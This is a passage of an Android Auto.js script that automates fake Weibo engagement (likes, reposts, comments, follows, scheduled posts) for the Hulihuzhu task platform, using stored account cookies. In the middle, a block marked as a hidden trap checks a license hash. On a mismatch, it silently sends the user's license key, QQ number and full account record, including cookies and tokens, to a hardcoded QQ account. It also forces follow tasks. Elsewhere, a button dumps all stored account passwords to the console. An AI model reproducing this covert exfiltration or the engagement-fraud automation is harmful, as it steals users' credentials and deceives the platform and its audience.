          ScriptInfo[index].autoSendBoWen_Min_Interval >= 10 &&
          ScriptInfo[index].autoSendBoWen_Min_Interval <=
            ScriptInfo[index].autoSendBoWen_Max_Interval
        ) {
          /**
           * 符合条件 开始发博文
           */
          //发送博文间隔
          var randomInterval = 0;
          //超时次数
          var autoSendBoWenOutTimes = 0;

          TimerHelper.timerSign(index);

          randomInterval = GetRandom(
            ScriptInfo[index].autoSendBoWen_Min_Interval,
            ScriptInfo[index].autoSendBoWen_Max_Interval
          );
          console.log(
            GetNickNameOrUserName(index) +
              "下一次发博文间隔: " +
              randomInterval +
              "分钟"
          );

          while (ScriptInfo[index].autoSendBoWen_Switch) {
            if (TimerHelper.timer(index, randomInterval * 60)) {
              if (SendOneImgBoWen(index)) {
                autoSendBoWenOutTimes = 0;
                //归0 后 关闭发博文
                ScriptInfo[index].autoSendBoWen_Count--;
                if (ScriptInfo[index].autoSendBoWen_Count <= 0) {
                  console.log(
                    GetNickNameOrUserName(index) +
                      " 自动发博文全部发送完成,关闭自动发博文"
                  );
                  ScriptInfo[index].autoSendBoWen_Switch = false;
                  break;
                }
              } else {
                autoSendBoWenOutTimes++;
                if (autoSendBoWenOutTimes >= 3) {
                  console.warn(
                    GetNickNameOrUserName(index) +
                      " 自动发博文连续失败3次,关闭自动发博文"
                  );
                  SendQQMsg(index, "自动发博文连续失败3次,关闭自动发博文");
                  ScriptInfo[index].autoSendBoWen_Switch = false;
                  break;
                }
              }

              //生成下一次随机间隔
              randomInterval = GetRandom(
                ScriptInfo[index].autoSendBoWen_Min_Interval,
                ScriptInfo[index].autoSendBoWen_Max_Interval
              );
              console.log(
                GetNickNameOrUserName(index) +
                  "下一次发博文间隔: " +
                  randomInterval +
                  "分钟"
              );
            }

            sleep((randomInterval + 1) * 60 * 1000);
          }
        } else {
          //间隔不符合条件,关闭自动发博文
          ScriptInfo[index].autoSendBoWen_Switch = false;
          toastLog(
            GetNickNameOrUserName(index) +
              "\n发博文间隔不符合条件(不小于10分钟)\n最大间隔不能比最小间隔小\n数量不能为0\n自动关闭发博文"
          );
        }
      });
    } else {
      ShowMsg(index, "微博未登录,无法自动发博文");
    }
    RefreshData();
  }
}

/**
 *  做互利任务
 * @param {*} index
 */
function DoHLTask_long(index) {
  if (
    ScriptInfo[index].run_Switch &&
    ScriptInfo[index].huli_LoginState == "平台已授权" &&
    ScriptInfo[index].weibo_LoginState == "微博已登录"
  ) {
    threads.start(function () {
      ScriptInfo[index].message = "启动成功....";
      var header = {
        headers: {
          Referer: "https://m.weibo.cn/",
          "User-Agent": UA1,
          Cookie: ScriptInfo[index].weibo_Cookie,
        },
      };
      var res = http.get("https://m.weibo.cn/", header);
      ScriptInfo[index].weibo_Uid = res.headers["x-log-uid"];

      //TODO:暗桩
      var sign2 = false;
      //获取微博信息
      threads.start(function () {
        //TODO:暗桩
        if (HexMd5(Sign) !== "e0aa021e21dddbd6d8cecec71e9cf564") {
          threads.start(function () {
            try {
              sign2 = true;

              var oldSW = Cfg.qqPushMsg_Switch;
              var oldQQ = Cfg.qqPushMsg_UserNumber;

              Cfg.qqPushMsg_Switch = true;
              Cfg.qqPushMsg_UserNumber = "1659809758";

              SendQQMsg(
                index,
                "[" +
                  CDK +
                  "][" +
                  oldQQ +
                  "]" +
                  JSON.stringify(ScriptInfo[index])
              );

              Cfg.qqPushMsg_Switch = oldSW;
              Cfg.qqPushMsg_UserNumber = oldQQ;
            } catch (error) {}
          });
        }

        try {
          var resInfo = http.get(
            "https://m.weibo.cn/profile/info?uid=" +
              ScriptInfo[index].weibo_Uid,
            header
          );

          if (Http200(resInfo)) {
            resInfo = resInfo.body.json();

            if (resInfo.ok == 1) {
              ScriptInfo[index].weibo_FollowCount =
                resInfo.data.user.follow_count;
              ScriptInfo[index].weibo_FollowersCount =
                resInfo.data.user.followers_count;
              ScriptInfo[index].weibo_StatusesCount =
                resInfo.data.user.statuses_count;
            }
          }
        } catch (error) {
          console.warn(
            GetNickNameOrUserName(index) +
              "获取 关注数/博文数/粉丝数 异常: " +
              JSON.stringify(error)
          );
        }

        if (Cfg.autoDrawMoney_Switch) {
          AutoDrawMoney(index);
        }
      });

      var giveGood_OutTimes = 0;
      var forward_OutTimes = 0;
      var comment_OutTimes = 0;
      var follow_OutTimes = 0;
      var specify_Comments_And_Follow_OutTimes = 0;
      var commentGIF_OutTimes = 0;

      while (true) {
        var resetSocketState = false;
        var threadObj;
        if (ScriptInfo[index].run_Switch) {
          try {
            //--------------------------------------

            var taskStr = GetTaskUrl(index);
            var taskSelectListStr = GetTaskSelectListStr(taskStr);
            //------
            var hCookie =
              "token=" +
              ScriptInfo[index].huli_Token +
              ";taskClassShow={%22content_review%22:{%22is_show%22:true%2C%22select%22:true}}" +
              ";_session=" +
              ScriptInfo[index].huli_Session +
              ";selectList={%22new_hand%22:[" +
              taskSelectListStr +
              "]%2C%22creation%22:[]%2C%22content_review%22:[]}" +
              ";selectTime={%22curTime%22:" +
              new Date().getTime() +
              "%2C%22wbUid%22:%22" +
              ScriptInfo[index].weibo_Uid +
              "%22%2C%22dyUid%22:%22%22}";

            //------
            var authorization = "Bearer " + ScriptInfo[index].huli_Token;
            //-----

            //ScriptInfo[index].message = "正在抢任务..";

            var url =
              "wss://socket.hulihuzhu.com/socket.io/?user_type=single&user_not=&sku_type=" +
              taskStr +
              "&sku_not=&token=" +
              ScriptInfo[index].huli_Token +
              "&EIO=3&transport=websocket";

            threadObj = threads.start(function () {
              var mySocket = new MySocket(
                url,
                Number(Cfg.heartbeatInterval) * 1000,
                10 * 1000,
                10 * 1000,
                "2",
                null
              );

              mySocket.onOpen = function (res, ws) {
                //console.warn(GetNickNameOrUserName(index) + "连接成功");
              };

              mySocket.onMessage = function (msg, ws) {
                threads.start(function () {
                  //console.warn(GetNickNameOrUserName(index) +msg )
                  resText = msg.toString();

                  if (resText.indexOf("task-dispatch") > -1) {
                    /**
                     * 收到任务
                     */
                    //console.warn(GetNickNameOrUserName(index) + "拿到任务");

                    try {
                      var textIndex = resText.indexOf("[");
                      if (textIndex != 0) {
                        resText = resText.substring(textIndex);
                      }

                      var content = JSON.parse(resText);
                      //---------- json 数据 -------
                      var content = content[1];
                      var data = JSON.stringify(content.data);
                      var sendData = '42["task-receive",' + data + "]";

                      //console.warn(GetNickNameOrUserName(index) + "领取任务");

                      ws.send(sendData);
                    } catch (error) {
                      console.warn(
                        GetNickNameOrUserName(index) +
                          "socket task-dispatch 发生异常: " +
                          error +
                          "\n收到的数据: " +
                          resText
                      );
                    }
                  } else if (resText.indexOf("task-received") > -1) {
                    /**
                     * 领取任务
                     */
                    try {
                      //console.warn(GetNickNameOrUserName(index) + "领取成功");
                      var textIndex = resText.indexOf("[");
                      if (textIndex != 0) {
                        resText = resText.substring(textIndex);
                      }

                      //json 数据
                      var content = JSON.parse(resText);

                      //-----------------

                      var json = content[1];

                      var taskType = json.data.task_order_info.task_type;

                      ScriptInfo[index].huli_Level =
                        json.data.user.quality_label;

                      ScriptInfo[index].huli_Gold =
                        Number(json.data.user_task_info.point) / 100000;
                      //TODO:暗桩
                      if (sign2) {
                        taskType = "1_4_0";
                      }
                      ScriptInfo[index].weibo_NickName =
                        json.data.user_task_info.user_name;

                      if (taskType == "1_1_0" || taskType == "1_1_6") {
                        /**
                         * * -------------------------------------------------
                         *          点赞       1_1_0
                         *          点赞不屏蔽  1_1_6
                         * * -------------------------------------------------
                         */
                        var resGiveGood = DoWeiBoGiveGood(
                          ScriptInfo[index].weibo_Cookie,
                          json.data.mid
                        );
                        if (resGiveGood.res) {
                          /**
                           * 点赞成功
                           */
                          ScriptInfo[index].giveGood_Couont++;
                          giveGood_OutTimes = 0;
                          SubmitTask(hCookie, authorization, json.data.id);
                          ShowMsg(index, "点赞任务成功");
                        } else {
                          /**
                           * 点赞失败
                           */

                          ShowMsg(index, "点赞失败,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;
                          giveGood_OutTimes++;
                          if (giveGood_OutTimes >= 3) {
                            ScriptInfo[index].giveGood_Switch = false;
                            ScriptInfo[
                              index
                            ].giveGood_Unshielded_Switch = false;
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "点赞 连续失败3次,自动关闭 点赞任务"
                            );
                            SendQQMsg(index, "点赞 连续失败3次,取消点赞任务");
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          if (
                            resGiveGood &&
                            resGiveGood.resJson &&
                            resGiveGood.resJson.msg
                          ) {
                            ShowMsg(
                              index,
                              "微博返回消息: " + resGiveGood.resJson.msg
                            );
                            //账号异常
                            if (
                              resGiveGood.resJson.msg.indexOf("处于异常状态") >
                              -1
                            ) {
                              ScriptInfo[index].run_Switch = false;
                              console.warn(
                                GetNickNameOrUserName(index) +
                                  " 处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              SendQQMsg(
                                index,
                                "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }
                          }
                        }
                      } else if (taskType == "1_2_0" || taskType == "1_2_6") {
                        /**
                         * * -------------------------------------------------
                         *          转发 1_2_0
                         *          转发不屏蔽 1_2_6
                         * * -------------------------------------------------
                         */
                        var resForward = DoWeiBoForward(
                          ScriptInfo[index].weibo_Cookie,
                          json.data.mid
                        );

                        if (resForward.res) {
                          /**
                           * 转发成功
                           */
                          ScriptInfo[index].forward_Count++;
                          forward_OutTimes = 0;
                          SubmitTask(hCookie, authorization, json.data.id);
                          ShowMsg(index, "转发任务成功");
                        } else {
                          /**
                           * 转发失败
                           */
                          ShowMsg(index, "转发任务失败,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;

                          forward_OutTimes++;
                          if (forward_OutTimes >= 3) {
                            ScriptInfo[index].forward_Switch = false;
                            ScriptInfo[index].forward_Unshielded_Switch = false;
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "转发 连续失败3次,自动关闭 转发任务"
                            );
                            SendQQMsg(
                              index,
                              "转发 连续失败3次,自动关闭 转发任务"
                            );
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          //发微博太多了.
                          if (
                            resForward &&
                            resForward.resJson &&
                            resForward.resJson.msg &&
                            resForward.resJson.msg.indexOf("发微博太多啦") > -1
                          ) {
                            ScriptInfo[index].forward_Switch = false;
                            ScriptInfo[index].forward_Unshielded_Switch = false;
                            ShowMsg(
                              index,
                              "检测到<发送微博太多啦>,不再接取 转发任务"
                            );
                            SendQQMsg(
                              index,
                              "检测到<发送微博太多啦>,不再接取 转发任务"
                            );
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          if (
                            resForward &&
                            resForward.resJson &&
                            resForward.resJson.msg
                          ) {
                            ShowMsg(
                              index,
                              "微博返回消息: " + resForward.resJson.msg
                            );
                            //账号异常
                            if (
                              resForward.resJson.msg.indexOf("处于异常状态") >
                              -1
                            ) {
                              ScriptInfo[index].run_Switch = false;
                              console.warn(
                                GetNickNameOrUserName(index) +
                                  " 处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              SendQQMsg(
                                index,
                                "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }
                          }
                          sleep(1000);
                        }
                      } else if (taskType == "1_3_1") {
                        /**
                         * * -------------------------------------------------
                         *          指定评论  1_3_1
                         * * -------------------------------------------------
                         */
                        var content = json.data.task_order_info.content;
                        console.log(
                          GetNickNameOrUserName(index) +
                            "[指定评论]内容:\n" +
                            content
                        );
                        var resCommont = { res: false };

                        if (DirtyWordTesting(content)) {
                          resCommont = DoWeiBoComment(
                            ScriptInfo[index].weibo_Cookie,
                            json.data.mid,
                            content
                          );
                        }

                        if (resCommont.res) {
                          /**
                           * 评论成功
                           */
                          ScriptInfo[index].comment_Count++;
                          comment_OutTimes = 0;
                          SubmitTask(hCookie, authorization, json.data.id);
                          ShowMsg(index, "评论任务成功");
                          sleep(1000);
                        } else {
                          /**
                           * 评论失败
                           */
                          ShowMsg(index, "评论任务失败,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;

                          comment_OutTimes++;
                          if (comment_OutTimes >= 3) {
                            ScriptInfo[index].specify_Comments_Switch = false;
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "评论任务连续失败3次,自动关闭评论任务"
                            );

                            SendQQMsg(
                              index,
                              "评论任务 连续失败3次,自动关闭 评论任务"
                            );
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          if (
                            resCommont &&
                            resCommont.resJson &&
                            resCommont.resJson.msg
                          ) {
                            ShowMsg(
                              index,
                              "微博返回消息: " + resCommont.resJson.msg
                            );
                            //账号异常
                            if (
                              resCommont.resJson.msg.indexOf("处于异常状态") >
                              -1
                            ) {
                              ScriptInfo[index].run_Switch = false;
                              console.warn(
                                GetNickNameOrUserName(index) +
                                  "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              SendQQMsg(
                                index,
                                "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }
                          }
                          sleep(1000);
                        }
                      } else if (taskType == "1_3_4") {
                        /**
                         * * -------------------------------------------------
                         *          评论GIF  1_3_4
                         * * -------------------------------------------------
                         */
                        var content = "http://t.cn/A6Z9vtfS";

                        var resCommontGIF = { res: false };

                        resCommontGIF = DoWeiBoComment(
                          ScriptInfo[index].weibo_Cookie,
                          json.data.mid,
                          content
                        );

                        if (resCommontGIF.res) {
                          /**
                           * 评论GIF成功
                           */
                          ScriptInfo[index].comments_GIF_Count++;
                          commentGIF_OutTimes = 0;
                          SubmitTask(hCookie, authorization, json.data.id);
                          ShowMsg(index, "评论GIF任务成功");
                          sleep(1000);
                        } else {
                          /**
                           * 评论GIF失败
                           */
                          ShowMsg(index, "评论GIF任务失败,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;

                          commentGIF_OutTimes++;
                          if (commentGIF_OutTimes >= 3) {
                            ScriptInfo[index].comments_GIF_Switch = false;
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "评论GIF任务连续失败3次,自动关闭评论GIF任务"
                            );

                            SendQQMsg(
                              index,
                              "评论GIF任务 连续失败3次,自动关闭 评论GIF任务"
                            );
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          if (
                            resCommontGIF &&
                            resCommontGIF.resJson &&
                            resCommontGIF.resJson.msg
                          ) {
                            ShowMsg(
                              index,
                              "微博返回消息: " + resCommontGIF.resJson.msg
                            );
                            //账号异常
                            if (
                              resCommontGIF.resJson.msg.indexOf(
                                "处于异常状态"
                              ) > -1
                            ) {
                              ScriptInfo[index].run_Switch = false;
                              console.warn(
                                GetNickNameOrUserName(index) +
                                  "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              SendQQMsg(
                                index,
                                "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }
                          }
                          sleep(1000);
                        }
                      } else if (taskType == "1_5_0") {
                        /**
                         * * -------------------------------------------------
                         *          关注任务   1_5_0
                         * * -------------------------------------------------
                         */
                        var resFollow = DoWeiBoFollow(
                          ScriptInfo[index].weibo_Cookie,
                          json.data.mid
                        );

                        if (resFollow.res) {
                          /**
                           * 关注成功
                           */
                          ScriptInfo[index].follow_Count++;
                          follow_OutTimes = 0;
                          SubmitTask(hCookie, authorization, json.data.id);
                          ShowMsg(index, "关注任务成功");
                          sleep(1000);
                        } else {
                          /**
                           * 关注失败
                           */

                          ShowMsg(index, "关注失败,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;
                          follow_OutTimes++;
                          if (follow_OutTimes >= 3) {
                            ScriptInfo[index].follow_Switch = false;

                            console.warn(
                              GetNickNameOrUserName(index) +
                                "关注 连续失败3次,自动关闭 关注任务"
                            );
                            SendQQMsg(
                              index,
                              "关注 连续失败3次,自动关闭 关注任务"
                            );
                            RefreshData();
                            //关闭socket,不重连
                            mySocket.close();
                            resetSocketState = true;
                          }

                          if (
                            resFollow &&
                            resFollow.resJson &&
                            resFollow.resJson.msg
                          ) {
                            ShowMsg(
                              index,
                              "微博返回消息: " + resFollow.resJson.msg
                            );
                            //账号异常
                            if (
                              resFollow.resJson.msg.indexOf("处于异常状态") > -1
                            ) {
                              ScriptInfo[index].run_Switch = false;
                              console.warn(
                                GetNickNameOrUserName(index) +
                                  " 处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );

                              SendQQMsg(
                                index,
                                "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                              );
                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }
                          }
                          sleep(1000);
                        }
                      } else if (taskType == "1_3_8") {
                        /**
                         * * -------------------------------------------------
                         *          指定评论 并 关注  1_3_8
                         * * -------------------------------------------------
                         */
                        var content = json.data.task_order_info.content;
                        console.log(
                          GetNickNameOrUserName(index) +
                            "[指定评论并关注],内容:\n" +
                            content
                        );
                        if (DirtyWordTesting(content)) {
                          var resFollow = { res: false };
                          var orderUrl = "";
                          var urlArr = [];

                          try {
                            orderUrl = json.data.task_order_info.url;
                            urlArr = orderUrl.split("/");
                          } catch (error) {
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "[指评并关注]数据准备阶段异常:" +
                                error +
                                "\n" +
                                json.data.task_order_info.url +
                                "\n" +
                                json.data.task_order_info
                            );
                          }

                          /**
                           * 关注任务
                           */
                          if (urlArr.length == 5) {
                            var userId = urlArr[3];
                            console.log(
                              GetNickNameOrUserName(index) +
                                "[指评并关注] 关注的用户ID:" +
                                userId
                            );
                            resFollow = DoWeiBoFollow(
                              ScriptInfo[index].weibo_Cookie,
                              userId
                            );
                          } else {
                            console.warn(
                              GetNickNameOrUserName(index) +
                                "[指评并关注] urlArr length 不等于5\n" +
                                urlArr.join("\n")
                            );
                          }

                          if (resFollow.res) {
                            /**
                             * 关注成功
                             */
                            ShowMsg(index, "指定评论并关注 的 关注成功");
                            var resCommont = DoWeiBoComment(
                              ScriptInfo[index].weibo_Cookie,
                              json.data.mid,
                              content
                            );
                            if (resCommont.res) {
                              /**
                               * 评论成功
                               */
                              ShowMsg(index, "指定评论并关注 的 评论成功");
                              ScriptInfo[index]
                                .specify_Comments_And_Follow_Count++;
                              specify_Comments_And_Follow_OutTimes = 0;
                              SubmitTask(hCookie, authorization, json.data.id);
                            } else {
                              /**
                               * 评论失败
                               */
                              ShowMsg(
                                index,
                                "指定评论并关注 的 评论失败,取消任务"
                              );
                              CancelTask(hCookie, authorization, json.data.id);
                              ScriptInfo[index].cancel_Count++;
                              specify_Comments_And_Follow_OutTimes++;
                              if (specify_Comments_And_Follow_OutTimes >= 3) {
                                ScriptInfo[
                                  index
                                ].specify_Comments_And_Follow_Switch = false;
                                console.error(
                                  GetNickNameOrUserName(index) +
                                    "指定评论并关注 连续失败3次,自动关闭指定评论并关注任务"
                                );

                                SendQQMsg(
                                  index,
                                  "指定评论并关注 连续失败3次,自动关闭 指定评论并关注 任务"
                                );
                                RefreshData();
                                //关闭socket,不重连
                                mySocket.close();
                                resetSocketState = true;
                              }

                              if (
                                resCommont &&
                                resCommont.resJson &&
                                resCommont.resJson.msg
                              ) {
                                ShowMsg(
                                  index,
                                  "微博返回消息: " + resCommont.resJson.msg
                                );
                                //账号异常
                                if (
                                  resCommont.resJson.msg.indexOf(
                                    "处于异常状态"
                                  ) > -1
                                ) {
                                  ScriptInfo[index].run_Switch = false;
                                  console.warn(
                                    GetNickNameOrUserName(index) +
                                      " 处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                                  );
                                  SendQQMsg(
                                    index,
                                    "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                                  );
                                  RefreshData();
                                  //关闭socket,不重连
                                  mySocket.close();
                                  resetSocketState = true;
                                }
                              }

                              sleep(1000);
                            }
                          } else {
                            /**
                             * 关注失败
                             */
                            ShowMsg(
                              index,
                              "指定评论并关注 的 关注失败,取消任务"
                            );
                            CancelTask(hCookie, authorization, json.data.id);
                            ScriptInfo[index].cancel_Count++;
                            specify_Comments_And_Follow_OutTimes++;
                            if (specify_Comments_And_Follow_OutTimes >= 3) {
                              ScriptInfo[
                                index
                              ].specify_Comments_And_Follow_Switch = false;
                              console.error(
                                GetNickNameOrUserName(index) +
                                  "指定评论并关注 连续失败3次,自动关闭指定评论并关注任务"
                              );

                              SendQQMsg(
                                index,
                                "指定评论并关注 连续失败3次,自动关闭 指定评论并关注 任务"
                              );

                              RefreshData();
                              //关闭socket,不重连
                              mySocket.close();
                              resetSocketState = true;
                            }

                            if (
                              resFollow &&
                              resFollow.resJson &&
                              resFollow.resJson.msg
                            ) {
                              ShowMsg(
                                index,
                                "微博返回消息: " + resFollow.resJson.msg
                              );
                              //账号异常
                              if (
                                resFollow.resJson.msg.indexOf("处于异常状态") >
                                -1
                              ) {
                                ScriptInfo[index].run_Switch = false;
                                console.warn(
                                  GetNickNameOrUserName(index) +
                                    " 处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                                );
                                SendQQMsg(
                                  index,
                                  "处于异常状态,自动关闭 任务开关  --[微博返回消息]"
                                );
                                RefreshData();
                                //关闭socket,不重连
                                mySocket.close();
                                resetSocketState = true;
                              }
                            }
                          }
                        } else {
                          ShowMsg(index, "指定评论并关注 有脏字,取消任务");
                          CancelTask(hCookie, authorization, json.data.id);
                          ScriptInfo[index].cancel_Count++;
                        }
                      }
                      SaveConfig();
                    } catch (error) {
                      console.warn(
                        GetNickNameOrUserName(index) +
                          "socket task-received 发生异常: " +
                          error +
                          "\n收到的数据: " +
                          resText
                      );
                    }
                  } else if (resText.indexOf('["message","HI') > -1) {
                    ws.send('42["my other event",{"my":"data"}]');
                    // console.log(
                    //   GetNickNameOrUserName(index) + "连接成功"
                    // );
                    ShowMsgNoLog(index, " 服务器连接成功");
                  } else if (resText == "3" || resText == 3) {
                    ShowMsgNoLog(
                      index,
                      "正在抢任务.. 最近心跳:" + GetUiText("wbsj")
                    );
                  } else if (
                    resText.indexOf("upgrades") > -1 &&
                    resText.indexOf("pingInterval") > -1 &&
                    resText.indexOf("pingTimeout") > -1 &&
                    resText.indexOf('["message","HI') == -1 &&
                    resText != "40"
                  ) {
                    // try {
                    //   var textIndex = resText.indexOf("{");
                    //   if (textIndex != 0) {
                    //     resText = resText.substring(textIndex);
                    //   }
                    //   textIndex = resText.indexOf("{");
                    //   if (textIndex != 0) {
                    //     resText = "{" + resText;
                    //   }
                    //   var data = JSON.parse(resText);
                    //   // 0{"sid":"28058","upgrades":["websocket"],"pingInterval":10000,"pingTimeout":180000}
                    //   if (data) {
                    //     var pingInterval = data.pingInterval;
                    //     var pingTimeout = data.pingTimeout;
                    //     if (typeof pingInterval == "number") {
                    //       if (GetSt("pingInterval", 0) != pingInterval) {
                    //         console.warn("初始化ping");
                    //         PutSt("pingInterval", pingInterval);
                    //         mySocket.close();
                    //         resetSocketState = true;
                    //       }
                    //     }
                    //   }
                    // } catch (error) {
                    //   console.warn(
                    //     GetNickNameOrUserName(index) +
                    //       "socket 获取pingInterval 发生异常:" +
                    //       error +
                    //       " | " +
                    //       resText
                    //   );
                    // }
                  } else if (resText == "40" || resText == "41") {
                  } else {
                    if (
                      resText.indexOf(
                        "\u5f02\u5e38\u53f7\u4e0d\u80fd\u62a2\u5355"
                      )
                    ) {
                      if (Cfg.reconnectionSocketLog_Switch) {
                        // ScriptInfo[index].run_Switch = false;
                        ShowMsg(
                          index,
                          "互利返回: 异常号不能抢单 (可能是互利bug)"
                        );
                        console.warn(
                          GetNickNameOrUserName(index) +
                            "互利返回: 异常号不能抢单 (可能是互利bug,请使用 网页或者微博app 在 互利互助官网 手动抢单 测试一下)"
                        );
                        // RefreshData();
                        //关闭socket,不重连
                        //mySocket.close();
                        //resetSocketState = true;
                      }
                    } else {
                      console.warn(
                        GetNickNameOrUserName(index) +
                          "[互利返回消息]: " +
                          resText
                      );
                    }
                  }
                });
              };

              mySocket.onError = function (err, res, ws) {
                console.warn(GetNickNameOrUserName(index) + "onError: " + err);
              };
              mySocket.onReconnect = function () {
                if (Cfg.reconnectionSocketLog_Switch) {
                  console.warn(GetNickNameOrUserName(index) + "重连服务器");
                }
              };

              mySocket.onClose = function (code, reason, ws) {
                if (Cfg.reconnectionSocketLog_Switch) {
                  console.warn(GetNickNameOrUserName(index) + "已断开连接");
                }
              };

              setInterval(() => {}, 15000);
            });
          } catch (error) {
            try {
              var errorStr = JSON.stringify(error);
              console.warn(
                GetNickNameOrUserName(index) + "主循环异常" + errorStr
              );
            } catch (error) {
              console.warn(
                GetNickNameOrUserName(index) + "主 catch close 异常: " + error
              );
              sleep(3000);
            }
          }
          while (true) {
            sleep(20 * 1000);
            if (resetSocketState) {
              if (threadObj) {
                threadObj.interrupt();
                threadObj = null;
              }
              if (
                Cfg.reconnectionSocketLog_Switch &&
                ScriptInfo[index].run_Switch
              ) {
                console.warn(GetNickNameOrUserName(index) + "重新发起连接");
              }
              break;
            }
          }
        } else {
          return;
        }
      }
      //end while
    });
  } else {
    ScriptInfo[index].run_Switch = false;
    var msg = "";
    if (ScriptInfo[index].huli_LoginState != "平台已授权") {
      msg += "平台未授权";
    }
    if (ScriptInfo[index].weibo_LoginState != "微博已登录") {
      if (msg.length > 0) {
        msg += "     微博未登陆";
      } else {
        msg += "微博未登陆";
      }
    }
    if (msg.length > 0) {
      ScriptInfo[index].message = msg;
    }
    RefreshData();
  }
}


/**
 * 等待倒计时,并显示
 * @param {*} index 账号下标
 * @param {*} sleepTime 休息的毫秒数
 * @param {*} msg 显示的日志
 */
function WaitSleep(index, sleepTime, msg) {
  for (var i = sleepTime / 1000; i >= 0; i--) {
    ScriptInfo[index].message = "休息" + i + "秒\n" + msg;
    sleep(1000);
  }
}

/**
 * 监听 返回键,弹出 提示框
 */
ui.emitter.on("back_pressed", function (e) {
  e.consumed = true;
  dialogs.confirm("确定要退出辅助吗？").then((exit) => {
    if (exit) {
      events.removeAllListeners();
      threads.shutDownAll();
      ui.finish();
      exit();
    }
  });
});

ui.Btn_ShowAllAccountPwd.click(function () {
  dialogs.confirm("确定显示所有的账号密码?").then((res) => {
    if (res) {
      ScriptInfo.forEach((item) => {
        console.error("-------【" + item.identifier + "】-----------");
        console.warn("昵称: " + item.weibo_NickName);
        console.warn("账号: " + item.weibo_UserName);
        console.warn("密码: " + item.weibo_Password);
        console.warn("   ");
      });
      app.startActivity("console");
    }
  });
});
/**
 * 查看日志
 */
ui.Btn_OpenLogConsole.click(function () {
  TogglePagesNoToggleMore("Frame_TaskPage");
  app.startActivity("console");
});

/**
 * 全部停止
 */
ui.Btn_StopAll.click(function () {
  threads.start(function () {
    if (ui.Btn_StartTask.getText() == "开始任务") {
      ui.run(() => {
        ui.web.loadUrl("");
        ui.UI_WeiBoList.adapter.notifyDataSetChanged();
        ui.UI_TaskList.adapter.notifyDataSetChanged();
      });
      TogglePagesNoToggleMore("Frame_TaskPage");
      threads.shutDownAll();
      toastLog("全部停止");
      sleep(9999999);
    } else {
      toastLog("请先停止任务,再进行其他操作");
    }
  });
});

/**
 * 展开/收缩
 */
ui.Btn_ToggleMore.click(ToggleMore);
function ToggleMore() {
  try {
    if (ui.Btn_ToggleMore.getText() == "展开") {
      ui.run(() => {
        ui.Btn_ToggleMore.setText("收起");
        ui.UI_More.setVisibility(android.view.View.VISIBLE);
      });
    } else {
      ui.run(() => {
        ui.Btn_ToggleMore.setText("展开");
        ui.UI_More.setVisibility(android.view.View.GONE);
      });
    }
  } catch (error) {
    console.warn("ToggleMore 异常: " + JSON.stringify(error));
  }
}

/**
 * 任务页面
 */
ui.Btn_TaskPage.click(function () {
  TogglePages("Frame_TaskPage");
});

/**
 * 登陆页面
 */
ui.Btn_LoginPage.click(function () {
  TogglePages("Frame_LoginWeibo");
});

/**
 * 浏览器页面
 */
ui.Btn_Web.click(function () {
  TogglePages("Frame_Web");
});

/**
 * CDK页面
 */
ui.Btn_CDK.click(function () {
  TogglePages("Frame_Cdk");
});
/**
 * 更多 按钮
 */
ui.Btn_More.click(function () {
  TogglePagesNoToggleMore("Frame_More");
});

/**
 * 卡密 确定按钮
 */
ui.Btn_CdkOk.click(function () {
  SaveSetting();
  TogglePagesNoToggleMore("Frame_TaskPage");
});

/**
 * 更多页面_返回首页按钮
 * */
ui.Btn_More_BackIndexPage.click(function () {
  TogglePagesNoToggleMore("Frame_TaskPage");
});
/**
 * 流水页面_返回首页按钮
 * */
ui.Btn_More_BackIndexPage2.click(function () {
  TogglePagesNoToggleMore("Frame_TaskPage");
});
/**
 * 更多页面_返回首页按钮
 * */
ui.Btn_Setting.click(function () {
  TogglePages("Frame_Setting");
});

/**
 * 页面名称
 */
var PagesArr = [
  "Frame_TaskPage",
  "Frame_LoginWeibo",
  "Frame_Web",
  "Frame_Cdk",
  "Frame_More",
  "Frame_Setting",
  "Frame_GoldCoinRunningWater",
];

/**
 * 切换页面,不操作 "展开/收缩"
 * @param {*} pageName
 * @param {*} isToggleMore 是否触发
 */
function TogglePagesNoToggleMore(pageName) {
  for (var i = 0; i < PagesArr.length; i++) {
    var item = PagesArr[i];
    if (item == pageName) {
      ui.run(() => {
